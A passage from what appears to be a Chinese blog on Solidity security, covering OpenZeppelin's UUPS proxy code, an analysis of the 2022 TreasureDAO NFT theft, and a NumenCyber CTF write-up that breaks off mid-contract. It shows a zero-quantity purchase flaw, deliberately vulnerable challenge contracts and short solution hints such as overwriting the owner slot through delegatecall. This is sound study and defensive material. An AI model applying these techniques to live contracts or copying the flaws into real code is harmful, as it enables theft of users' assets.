UUPS proxies. The functions included here can perform an upgrade of an</span><br><span class="line"> * &#123;ERC1967Proxy&#125;, when this contract is set as the implementation behind such a proxy.</span><br><span class="line"> *</span><br><span class="line"> * A security mechanism ensures that an upgrade does not turn off upgradeability accidentally, although this risk is</span><br><span class="line"> * reinstated if the upgrade retains upgradeability but removes the security mechanism, e.g. by replacing</span><br><span class="line"> * `UUPSUpgradeable` with a custom implementation of upgrades.</span><br><span class="line"> *</span><br><span class="line"> * The &#123;_authorizeUpgrade&#125; function must be overridden to include access restriction to the upgrade mechanism.</span><br><span class="line"> *</span><br><span class="line"> * _Available since v4.1._</span><br><span class="line"> */</span><br><span class="line">abstract contract UUPSUpgradeable is IERC1822Proxiable, ERC1967Upgrade &#123;</span><br><span class="line">    /// @custom:oz-upgrades-unsafe-allow state-variable-immutable state-variable-assignment</span><br><span class="line">    address private immutable __self = address(this);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Check that the execution is being performed through a delegatecall call and that the execution context is</span><br><span class="line">     * a proxy contract with an implementation (as defined in ERC1967) pointing to self. This should only be the case</span><br><span class="line">     * for UUPS and transparent proxies that are using the current contract as their implementation. Execution of a</span><br><span class="line">     * function through ERC1167 minimal proxies (clones) would not normally pass this test, but is not guaranteed to</span><br><span class="line">     * fail.</span><br><span class="line">     */</span><br><span class="line">    modifier onlyProxy() &#123;</span><br><span class="line">        require(address(this) != __self, &quot;Function must be called through delegatecall&quot;);</span><br><span class="line">        require(_getImplementation() == __self, &quot;Function must be called through active proxy&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Check that the execution is not being performed through a delegate call. This allows a function to be</span><br><span class="line">     * callable on the implementing contract but not through proxies.</span><br><span class="line">     */</span><br><span class="line">    modifier notDelegated() &#123;</span><br><span class="line">        require(address(this) == __self, &quot;UUPSUpgradeable: must not be called through delegatecall&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Implementation of the ERC1822 &#123;proxiableUUID&#125; function. This returns the storage slot used by the</span><br><span class="line">     * implementation. It is used to validate the implementation&#x27;s compatibility when performing an upgrade.</span><br><span class="line">     *</span><br><span class="line">     * IMPORTANT: A proxy pointing at a proxiable contract should not be considered proxiable itself, because this risks</span><br><span class="line">     * bricking a proxy that upgrades to it, by delegating to itself until out of gas. Thus it is critical that this</span><br><span class="line">     * function revert if invoked through a proxy. This is guaranteed by the `notDelegated` modifier.</span><br><span class="line">     */</span><br><span class="line">    function proxiableUUID() external view virtual notDelegated returns (bytes32) &#123;</span><br><span class="line">        return _IMPLEMENTATION_SLOT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Upgrade the implementation of the proxy to `newImplementation`.</span><br><span class="line">     *</span><br><span class="line">     * Calls &#123;_authorizeUpgrade&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;Upgraded&#125; event.</span><br><span class="line">     *</span><br><span class="line">     * @custom:oz-upgrades-unsafe-allow-reachable delegatecall</span><br><span class="line">     */</span><br><span class="line">    function upgradeTo(address newImplementation) public virtual onlyProxy &#123;</span><br><span class="line">        _authorizeUpgrade(newImplementation);</span><br><span class="line">        _upgradeToAndCallUUPS(newImplementation, new bytes(0), false);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Upgrade the implementation of the proxy to `newImplementation`, and subsequently execute the function call</span><br><span class="line">     * encoded in `data`.</span><br><span class="line">     *</span><br><span class="line">     * Calls &#123;_authorizeUpgrade&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;Upgraded&#125; event.</span><br><span class="line">     *</span><br><span class="line">     * @custom:oz-upgrades-unsafe-allow-reachable delegatecall</span><br><span class="line">     */</span><br><span class="line">    function upgradeToAndCall(address newImplementation, bytes memory data) public payable virtual onlyProxy &#123;</span><br><span class="line">        _authorizeUpgrade(newImplementation);</span><br><span class="line">        _upgradeToAndCallUUPS(newImplementation, data, true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Function that should revert when `msg.sender` is not authorized to upgrade the contract. Called by</span><br><span class="line">     * &#123;upgradeTo&#125; and &#123;upgradeToAndCall&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Normally, this function will use an xref:access.adoc[access control] modifier such as &#123;Ownable-onlyOwner&#125;.</span><br><span class="line">     *</span><br><span class="line">     * ```solidity</span><br><span class="line">     * function _authorizeUpgrade(address) internal  onlyOwner &#123;&#125;</span><br><span class="line">     * ```</span><br><span class="line">     */</span><br><span class="line">    function _authorizeUpgrade(address newImplementation) internal virtual;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-1"><a href="#Analyse-1" class="headerlink" title="Analyse"></a>Analyse</h2><p><img src="https://cdto2wxndf.feishu.cn/space/api/box/stream/download/asynccode/?code=MjAyMjM4YzNiY2EwYjkzMGM0ZjA4YTgwNTliODc1OGRfVkpCc2YyYmdwSjA2R0hzSW1wZk56QmpzNk5INGRYOXFfVG9rZW46QklSZGJnN3dGb1ljQTB4VlFwUGNRNjBlbmtmXzE2OTAwMzEyNjk6MTY5MDAzNDg2OV9WNA" alt="img"></p><p>UUPSUpgradeable—-&gt; ERC1967Update</p><p>用户和代理合约交互，代理合约不直接实现<code>upgradeTo</code>和<code>upgradeToAndCall</code>，由逻辑合约实现。</p><p>UUPSUpgrateable是逻辑合约而非代理合约</p>]]></content>
      
      
      <categories>
          
          <category> -知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TreasureDAO攻击事件</title>
      <link href="/2023/07/22/solidity/%E7%B2%BE%E5%8D%8E/TreasureDAO%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/"/>
      <url>/2023/07/22/solidity/%E7%B2%BE%E5%8D%8E/TreasureDAO%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p><strong>关键词:  NFT</strong></p><p><strong>作者:</strong> ChainSecLabs</p><p><strong>攻击发生时间: 2022年3月3日</strong></p><p><strong>损失金额：140万美元</strong></p><h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>Treasure 通过一种开放和可组合的方法，为日益增长的元宇宙架起了桥梁，使NFTs、DeFi和游戏融合在一起。北京时间2022年3月3日，TreasureDAO遭受黑客攻击，过百枚NFT被盗走，价值约140万美元。</p><h1 id="攻击地址及交易信息"><a href="#攻击地址及交易信息" class="headerlink" title="攻击地址及交易信息"></a>攻击地址及交易信息</h1><p>攻击者钱包：<a href="https://arbiscan.io/address/0x9b1acd4336ebf7656f49224d14a892566fd48e68">0x9b1acd4336ebf7656f49224d14a892566fd48e68</a></p><p>攻击者交:<a href="https://arbiscan.io/tx/0xb169e20b45c6a5b7e5726c812af73c0b48996a4db04b076d6ef484ca5a300d36">0xb169e20b45c6a5b7e5726c812af73c0b48996a4db04b076d6ef484ca5a300d36</a></p><p>出现漏洞的合约地址:</p><p><strong>TreasureMarketplaceBuyer:****<a href="https://arbiscan.io/address/0x812cda2181ed7c45a35a691e0c85e231d218e273#code">0x812cda2181ed7c45a35a691e0c85e231d218e273</a></strong></p><p><strong>TreasureMarketplace :****<a href="https://arbiscan.io/address/0x2e3b85f85628301a0bce300dee3a6b04195a15ee#code">0x2e3b85f85628301a0bce300dee3a6b04195a15ee</a></strong></p><h1 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h1><p><strong>TreasureMarketplaceBuyer</strong>：0x812cdA2181ed7c45a35a691E0C85E231D218E273</p><p>攻击者的交易过程</p><p><img src="https://cdto2wxndf.feishu.cn/space/api/box/stream/download/asynccode/?code=M2Y4YmMwZDdiYjNjNmI1NzM3NmVmOTk1YmUxNTgzMGRfQ3U3bzRFS01oTWVOVmV5TUhGZ3kwdHF1TW1LNWRMUHZfVG9rZW46QTlMYWJxbzAxb2NWcWd4TmRabmNmdTlNbnhlXzE2OTAwMzA5MjI6MTY5MDAzNDUyMl9WNA" alt="img"></p><p>攻击者调用TreasureMarketplaceBuyer合约中buyItem方法获取了NFT，传入的_quantity为0，但是仍然得到了一枚NFT，是什么原因呢？</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>我们分析一下TreasureMarketplaceBuyer合约中butItem函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> function buyItem(</span><br><span class="line">    address _nftAddress,</span><br><span class="line">    uint256 _tokenId,</span><br><span class="line">    address _owner,</span><br><span class="line">    uint256 _quantity,</span><br><span class="line">    uint256 _pricePerItem</span><br><span class="line">) external &#123;</span><br><span class="line">    (, uint256 pricePerItem,) = marketplace.listings(_nftAddress, _tokenId, _owner);</span><br><span class="line"></span><br><span class="line">    require(pricePerItem == _pricePerItem, &quot;pricePerItem changed!&quot;);</span><br><span class="line"></span><br><span class="line">    uint256 totalPrice = _pricePerItem * _quantity;//0</span><br><span class="line">    IERC20(marketplace.paymentToken()).safeTransferFrom(msg.sender, address(this), totalPrice);</span><br><span class="line">    IERC20(marketplace.paymentToken()).safeApprove(address(marketplace), totalPrice);</span><br><span class="line"></span><br><span class="line">    marketplace.buyItem(_nftAddress, _tokenId, _owner, _quantity);</span><br><span class="line"></span><br><span class="line">    if (IERC165(_nftAddress).supportsInterface(INTERFACE_ID_ERC721)) &#123;</span><br><span class="line">        IERC721(_nftAddress).safeTransferFrom(address(this), msg.sender, _tokenId);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        IERC1155(_nftAddress).safeTransferFrom(address(this), msg.sender, _tokenId, _quantity, bytes(&quot;&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析buyItem可以发现，当_quantity为0时我们可以使得totalPrice为0，从而完成0资金购买，然后进入marketplace中的buyItem</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function buyItem(</span><br><span class="line">    address _nftAddress,</span><br><span class="line">    uint256 _tokenId,</span><br><span class="line">    address _owner,</span><br><span class="line">    uint256 _quantity</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    nonReentrant</span><br><span class="line">    isListed(_nftAddress, _tokenId, _owner)</span><br><span class="line">    validListing(_nftAddress, _tokenId, _owner)</span><br><span class="line">&#123;</span><br><span class="line">    require(_msgSender() != _owner, &quot;Cannot buy your own item&quot;);</span><br><span class="line"></span><br><span class="line">    Listing memory listedItem = listings[_nftAddress][_tokenId][_owner];</span><br><span class="line">    require(listedItem.quantity &gt;= _quantity, &quot;not enough quantity&quot;);</span><br><span class="line"></span><br><span class="line">    // Transfer NFT to buyer</span><br><span class="line">    if (IERC165(_nftAddress).supportsInterface(INTERFACE_ID_ERC721)) &#123;</span><br><span class="line">        IERC721(_nftAddress).safeTransferFrom(_owner, _msgSender(), _tokenId);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        IERC1155(_nftAddress).safeTransferFrom(_owner, _msgSender(), _tokenId, _quantity, bytes(&quot;&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">    //other code</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在marketplace中我们发现如果我们买的是ERC721nft那么_quantity是0也不会影响我们得到一个NFT。因此我们0资金来换取了一个有价值的NFT</p><h1 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h1><ul><li>有关代币转移的操作都应慎重考虑</li><li>应检查用户购买数量的合法性，同时防止零资金购买NFT。</li><li>将ERC721及ERC1155协议的NFT进行分开处理，避免混淆情况发生</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/SierraW/article/details/123275174">https://blog.csdn.net/SierraW/article/details/123275174</a></p><p><a href="https://zhuanlan.zhihu.com/p/475681450">https://zhuanlan.zhihu.com/p/475681450</a></p>]]></content>
      
      
      <categories>
          
          <category> -知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NumenCyber CTF</title>
      <link href="/2023/07/22/solidity/%E7%B2%BE%E5%8D%8E/NumenCyber%20CTF/"/>
      <url>/2023/07/22/solidity/%E7%B2%BE%E5%8D%8E/NumenCyber%20CTF/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01SimpleCall"><a href="#0x01SimpleCall" class="headerlink" title="0x01SimpleCall"></a>0x01SimpleCall</h1><h2 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.7.0;</span><br><span class="line">    </span><br><span class="line">contract ExistingStock &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    address private reserve;</span><br><span class="line"></span><br><span class="line">    string public name = &quot;Existing Stock&quot;;</span><br><span class="line">    string public symbol = &quot;ES&quot;;</span><br><span class="line">    uint256 public decimals = 18;</span><br><span class="line">    uint256 public totalSupply = 200000000000;</span><br><span class="line">    uint8 public frequency = 1;</span><br><span class="line"></span><br><span class="line">    bool public Lock = false;</span><br><span class="line">    bool public result;</span><br><span class="line">    bool public flag;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed from, address indexed to, uint number);</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint number);</span><br><span class="line">    event Deposit(address indexed to, uint number);</span><br><span class="line">    event Withdraw(address indexed from, uint number);</span><br><span class="line">    event Target(address indexed from, bool result);</span><br><span class="line">    </span><br><span class="line">    mapping (address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping (address =&gt; mapping (address =&gt; uint)) public allowance;</span><br><span class="line">    </span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        balanceOf[owner] = totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address to, uint number) public returns (bool) &#123;</span><br><span class="line">        allowance[msg.sender][to] = number;</span><br><span class="line">        emit Approval(msg.sender, to, number);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">        require(balanceOf[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balanceOf[msg.sender] -= _value;</span><br><span class="line">        balanceOf[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function transferFrom(address from, address to, uint number) public returns (bool)&#123;</span><br><span class="line"></span><br><span class="line">        require(balanceOf[from] &gt;= number);</span><br><span class="line"></span><br><span class="line">        if (from != msg.sender &amp;&amp; allowance[from][msg.sender] != uint256(-1)) &#123;</span><br><span class="line">            require(allowance[from][msg.sender] &gt;= number);</span><br><span class="line">            allowance[from][msg.sender] -= number;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        balanceOf[from] -= number;</span><br><span class="line">        balanceOf[to] += number;</span><br><span class="line">    </span><br><span class="line">        emit Transfer(from, to, number);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function privilegedborrowing(uint256 value,address secure,address target,bytes memory data) public &#123;</span><br><span class="line">        require(Lock == false &amp;&amp; value &gt;= 0 &amp;&amp; value &lt;= 1000);</span><br><span class="line">        balanceOf[address(this)] -= value;</span><br><span class="line">        balanceOf[target] += value;</span><br><span class="line"></span><br><span class="line">        address(target).call(data);</span><br><span class="line">    </span><br><span class="line">        Lock = true; </span><br><span class="line"></span><br><span class="line">        require(balanceOf[target] &gt;= value);</span><br><span class="line">        balanceOf[address(this)] += value;</span><br><span class="line">        balanceOf[target] -= value;</span><br><span class="line"></span><br><span class="line">        Lock = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint number) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= number);</span><br><span class="line">        balanceOf[msg.sender] -= number;</span><br><span class="line">        (msg.sender).transfer(number);</span><br><span class="line">        emit Withdraw(msg.sender, number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setflag() public &#123;</span><br><span class="line">        if(balanceOf[msg.sender] &gt; 200000 &amp;&amp; allowance[address(this)][msg.sender] &gt; 200000)&#123;</span><br><span class="line">            flag = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns(bool)&#123;</span><br><span class="line">        return flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h2><p>直接调用privilegedborrowing函数，用里面的call来approve就可以了</p><h1 id="0x02HEXP（未解决）"><a href="#0x02HEXP（未解决）" class="headerlink" title="0x02HEXP（未解决）"></a>0x02HEXP（未解决）</h1><h2 id="Source-Code-1"><a href="#Source-Code-1" class="headerlink" title="Source Code"></a>Source Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Hexp &#123;</span><br><span class="line">    address public immutable target;</span><br><span class="line">    bool flag;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        bytes memory code = hex&quot;3d602d80600a3d3981f362ffffff80600a43034016903a1681146016576033fe5b5060006000f3&quot;;</span><br><span class="line">        address child;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            child := create(0, add(code, 0x20), mload(code))</span><br><span class="line">        &#125;</span><br><span class="line">        target = child;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function f00000000_bvvvdlt() external &#123;</span><br><span class="line">        (bool succ, bytes memory ret) = target.call(hex&quot;&quot;);</span><br><span class="line">        assert(succ);</span><br><span class="line">        flag = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        return flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-1"><a href="#Analyse-1" class="headerlink" title="Analyse"></a>Analyse</h2><h1 id="0x03-Counter"><a href="#0x03-Counter" class="headerlink" title="0x03 Counter"></a>0x03 Counter</h1><h2 id="Source-Code-2"><a href="#Source-Code-2" class="headerlink" title="Source Code"></a>Source Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line">    constructor(bytes memory code) &#123; assembly &#123; return (add(code, 0x20), mload(code)) &#125; &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract SmartCounter&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    address public target;</span><br><span class="line">    bool flag=false;</span><br><span class="line">    constructor(address owner_)&#123;</span><br><span class="line">        owner=owner_;</span><br><span class="line">    &#125;</span><br><span class="line">    function create(bytes memory code) public&#123;</span><br><span class="line">        require(code.length&lt;=24);</span><br><span class="line">        target=address(new Deployer(code));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function A_delegateccall(bytes memory data) public&#123;</span><br><span class="line">        (bool success,bytes memory returnData)=target.delegatecall(data);</span><br><span class="line">        require(owner==msg.sender);</span><br><span class="line">        flag=true;</span><br><span class="line">    &#125;</span><br><span class="line">    function isSolved() public view returns(bool)&#123;</span><br><span class="line">        return flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-2"><a href="#Analyse-2" class="headerlink" title="Analyse"></a>Analyse</h2><p>直接覆盖 sstore(0,tx.origin)对应opcode:0x323455</p><h1 id="0x04Exist"><a href="#0x04Exist" class="headerlink" title="0x04Exist"></a>0x04Exist</h1><h2 id="Source-Code-3"><a href="#Source-Code-3" class="headerlink" title="Source Code"></a>Source Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">contract Existing&#123;</span><br><span class="line"></span><br><span class="line">    string public name = &quot;Existing&quot;;</span><br><span class="line">    string public symbol = &quot;EG&quot;;</span><br><span class="line">    uint256 public decimals = 18;</span><br><span class="line">    uint256 public totalSupply = 10000000;</span><br><span class="line">    bool public flag = false;</span><br><span class="line"></span><br><span class="line">    mapping(address=&gt;bool)public status;</span><br><span class="line"></span><br><span class="line">    event SendFlag(address addr);</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint) public balanceOf;</span><br><span class="line"></span><br><span class="line">    bytes20 internal appearance = bytes20(bytes32(&quot;ZT&quot;))&gt;&gt;144;</span><br><span class="line">    bytes20 internal maskcode = bytes20(uint160(0xffff));</span><br><span class="line"></span><br><span class="line">    constructor()public&#123; </span><br><span class="line">        balanceOf[address(this)] += totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to,uint amount) external &#123;</span><br><span class="line">        _transfer(msg.sender,to,amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address from,address to,uint amount) internal &#123;</span><br><span class="line">        require(balanceOf[from] &gt;= amount,&quot;amount exceed&quot;);</span><br><span class="line">        require(to != address(0),&quot;you cant burn my token&quot;);</span><br><span class="line">        require(balanceOf[to]+amount &gt;= balanceOf[to]);</span><br><span class="line">        balanceOf[from] -= amount;</span><br><span class="line">        balanceOf[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier only_family&#123;</span><br><span class="line">        require(is_my_family(msg.sender),</span><br><span class="line">        &quot;no no no,my family only&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier only_EOA(address msgs)&#123;</span><br><span class="line">        uint x;</span><br><span class="line">        assembly &#123; </span><br><span class="line">            x := extcodesize(msgs) </span><br><span class="line">            &#125;</span><br><span class="line">        require(x == 0,&quot;Only EOA can do that&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    function is_my_family(address account) internal returns (bool) &#123;</span><br><span class="line">        bytes20 you = bytes20(account);</span><br><span class="line"></span><br><span class="line">        bytes20 code = maskcode;</span><br><span class="line">        bytes20 feature = appearance;</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; 34; i++) &#123;</span><br><span class="line">            if (you &amp; code == feature) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            code &lt;&lt;= 4;</span><br><span class="line">            feature &lt;&lt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function share_my_vault() external only_EOA(msg.sender) only_family &#123;</span><br><span class="line">        uint256 add = balanceOf[address(this)];</span><br><span class="line">        _transfer(address(this),msg.sender,add);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setflag() external&#123;</span><br><span class="line">        if(balanceOf[msg.sender] &gt;= totalSupply) &#123;</span><br><span 